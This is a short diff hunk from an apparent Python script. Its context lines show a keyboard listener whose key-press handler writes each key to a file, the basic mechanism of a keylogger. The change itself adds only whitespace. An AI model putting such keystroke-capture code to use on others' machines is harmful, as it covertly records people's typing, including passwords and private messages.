@@ -21,3 +21,5 @@ def write_to_file(key):
 
 with Listener(on_press=write_to_file) as lis:
     lis.join()
+    
+ 
